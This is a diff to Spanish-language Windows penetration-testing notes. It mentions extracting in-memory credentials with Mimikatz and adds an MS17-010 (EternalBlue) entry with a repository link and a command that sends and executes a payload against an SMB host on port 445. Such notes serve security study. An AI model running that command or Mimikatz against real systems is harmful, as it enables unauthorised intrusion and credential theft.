@@ -131,7 +131,9 @@ Pentest sobre windows.
                     ========================================= ================================================================== ========
                     SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
         -Credenciales en memoria: Utilizando software como Mimikatz es posible extraer credenciales que se encuentren almacenadas en memoría.
-        -Exploit locales.
+        -Exploit.
+			MS17-10: https://github.com/helviojunior/MS17-010
+				-python2 send_and_execute.py 10.10.10.10 ../exploit.exe 445 netlogon
     -Pivoting
     -BufferOverflow (x86,x64)
     
